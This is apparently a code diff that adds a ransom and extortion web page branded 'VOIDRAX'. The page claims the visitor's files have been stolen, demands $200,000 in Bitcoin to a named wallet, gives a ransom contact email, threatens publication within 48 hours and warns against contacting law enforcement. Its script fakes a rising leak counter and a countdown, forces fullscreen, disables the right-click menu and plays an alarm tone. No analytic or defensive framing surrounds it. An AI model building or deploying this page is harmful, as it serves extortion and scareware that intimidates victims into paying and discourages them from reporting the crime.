@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🔐 BREACH – IMMEDIATE ACTION</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            margin:0;
+        }
+        .terminal {
+            background: #111;
+            border: 3px solid #ff0040;
+            border-radius: 12px;
+            padding: 40px 30px;
+            max-width: 820px;
+            width: 100%;
+            box-shadow: 0 0 60px rgba(255,0,64,0.5);
+            color: #e0e0e0;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 2px solid #ff0040;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+        .header h1 {
+            color: #ff0040;
+            font-size: 1.8rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px rgba(255,0,64,0.6);
+        }
+        .header .id {
+            background: #1a1a1a;
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            border: 1px solid #ff0040;
+            color: #ff0040;
+        }
+        .blink {
+            animation: blink 0.8s step-end infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .data-box {
+            background: #0d0d0d;
+            border-left: 5px solid #ff0040;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 1rem;
+            line-height: 1.8;
+        }
+        .data-box .highlight {
+            color: #ff0040;
+            font-weight: bold;
+        }
+        .data-box .leak {
+            color: #ffcc00;
+            font-weight: bold;
+        }
+        .wallet {
+            background: #1a1a1a;
+            padding: 18px 20px;
+            border-radius: 8px;
+            font-size: 1.3rem;
+            text-align: center;
+            letter-spacing: 2px;
+            border: 2px dashed #ffcc00;
+            margin: 20px 0;
+            word-break: break-all;
+            color: #ffcc00;
+        }
+        .timer-grid {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 25px 0;
+            font-size: 2.2rem;
+            font-weight: bold;
+            color: #ffcc00;
+        }
+        .timer-grid div {
+            background: #0d0d0d;
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            min-width: 70px;
+            text-align: center;
+        }
+        .timer-grid span {
+            font-size: 0.9rem;
+            color: #888;
+            display: block;
+            margin-top: 4px;
+        }
+        .btn {
+            display: inline-block;
+            background: #ff0040;
+            color: #fff;
+            padding: 16px 32px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: 1.1rem;
+            box-shadow: 0 0 30px rgba(255,0,64,0.3);
+        }
+        .btn:hover {
+            background: #cc0033;
+            transform: scale(0.97);
+        }
+        .btn-gray {
+            background: #222;
+            color: #888;
+        }
+        .btn-gray:hover {
+            background: #333;
+        }
+        .footnote {
+            margin-top: 25px;
+            font-size: 0.7rem;
+            color: #555;
+            text-align: center;
+            border-top: 1px solid #222;
+            padding-top: 15px;
+        }
+        .leak-counter {
+            background: #1a0a0a;
+            border: 1px solid #ff0040;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 1.1rem;
+            color: #ff6666;
+        }
+        @media (max-width: 600px) {
+            .terminal { padding: 20px; }
+            .timer-grid { font-size: 1.6rem; gap: 8px; }
+            .timer-grid div { padding: 8px 12px; min-width: 55px; }
+            .wallet { font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <div class="header">
+            <h1>⛓️ VOIDRAX</h1>
+            <div class="id">🔐 #0x7B3F</div>
+        </div>
+        <div class="data-box">
+            <p>⚠️ <span class="highlight">DATA BREACH DETECTED</span> — Your files are being exfiltrated.</p>
+            <p>📁 Documents, databases, backups, images — <span class="highlight">all copied to our servers</span>.</p>
+            <p>🌐 <span class="leak">LEAK PROTOCOL ACTIVE:</span> If payment is not received, <span class="highlight">all client data, financials, and employee records</span> will be published on the dark web within <span class="leak">48 hours</span>.</p>
+        </div>
+        <div class="leak-counter">
+            🔥 <span id="leakCount">0</span> files already leaked to our public server (increments every 5 seconds).
+        </div>
+        <div class="wallet">
+            bc1qg4pc08qyz0ghvkasqx9d59vv9hn8v8twkzndpw
+        </div>
+        <div style="text-align:center; color:#aaa; font-size:1rem; margin:10px 0;">
+            Send <span style="color:#ffcc00; font-weight:bold;">$200,000 USD</span> in Bitcoin to the address above.
+        </div>
+        <div class="timer-grid">
+            <div>47<span>hours</span></div>
+            <div>59<span>mins</span></div>
+            <div>59<span>secs</span></div>
+        </div>
+        <div style="text-align:center; margin-top:5px;">
+            <p style="color:#ff6666; font-size:0.9rem;">
+                ⏳ <span class="blink">Payment must be confirmed within 48 hours.</span> After that, <span class="highlight">data is leaked</span>.
+            </p>
+        </div>
+        <div style="text-align:center; margin:20px 0;">
+            <a href="#" class="btn" onclick="alert('⚠️ Payment verification will begin after 1 blockchain confirmation. Do not close this page.');">✅ Verify Payment</a>
+            <a href="mailto:ransom@onionmail.org?subject=PAYMENT_READY" class="btn btn-gray" style="margin-left:10px;">📧 Support</a>
+        </div>
+        <div style="background:#0d0d0d; padding:12px; border-radius:6px; margin:10px 0; border:1px solid #333;">
+            <p style="color:#888; font-size:0.85rem; text-align:center;">
+                ⚠️ <span style="color:#ff0040;">DO NOT</span> attempt to close this page – your files are already copied.<br />
+                ⚠️ <span style="color:#ff0040;">DO NOT</span> contact law enforcement – we will know and leak everything immediately.
+            </p>
+        </div>
+        <div class="footnote">
+            <span class="blink">●</span> VOIDRAX v3.2 — Your data is ours. Pay and forget.
+        </div>
+    </div>
+    <script>
+        let leakCount = 0;
+        setInterval(() => {
+            leakCount += Math.floor(Math.random() * 3) + 1;
+            document.getElementById('leakCount').innerText = leakCount;
+            if (leakCount > 500) {
+                document.querySelector('.leak-counter').style.color = '#ff0040';
+                document.querySelector('.leak-counter').innerHTML = '🔥 <span id="leakCount">' + leakCount + '</span> files leaked — <span style="color:#ff0040;">PUBLIC RELEASE IMMINENT</span>';
+            }
+        }, 5000);
+
+        let totalSeconds = 48 * 3600;
+        const timerElements = document.querySelectorAll('.timer-grid div');
+        setInterval(() => {
+            if (totalSeconds <= 0) {
+                timerElements[0].innerHTML = '0<span>hours</span>';
+                timerElements[1].innerHTML = '0<span>mins</span>';
+                timerElements[2].innerHTML = '0<span>secs</span>';
+                document.querySelector('.leak-counter').innerHTML = '🔥 <span style="color:#ff0040;">DATA LEAKED — PUBLIC ARCHIVE AVAILABLE</span>';
+                return;
+            }
+            totalSeconds--;
+            const h = Math.floor(totalSeconds / 3600);
+            const m = Math.floor((totalSeconds % 3600) / 60);
+            const s = totalSeconds % 60;
+            timerElements[0].innerHTML = h + '<span>hours</span>';
+            timerElements[1].innerHTML = m + '<span>mins</span>';
+            timerElements[2].innerHTML = s + '<span>secs</span>';
+
+            if (totalSeconds < 12 * 3600 && totalSeconds > 0) {
+                document.querySelector('.timer-grid').style.color = '#ff6600';
+                document.querySelector('.header h1').style.color = '#ff6600';
+                document.querySelector('.header h1').textContent = '⛓️ VOIDRAX – FINAL WARNING';
+            }
+            if (totalSeconds < 3600 && totalSeconds > 0) {
+                document.querySelector('.timer-grid').style.color = '#ff0000';
+                document.querySelector('.terminal').style.borderColor = '#ff0000';
+                document.querySelector('.terminal').style.boxShadow = '0 0 80px rgba(255,0,0,0.7)';
+            }
+        }, 1000);
+
+        document.addEventListener('click', function() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        });
+        window.onload = function() {
+            setTimeout(() => {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }, 500);
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+        };
+
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            setInterval(() => {
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume();
+                }
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.frequency.value = 900 + Math.random() * 200;
+                osc.type = 'sawtooth';
+                gain.gain.value = 0.1;
+                osc.start();
+                setTimeout(() => { osc.stop(); }, 400);
+            }, 2000);
+        } catch (e) {}
+    </script>
+</body>
+</html>
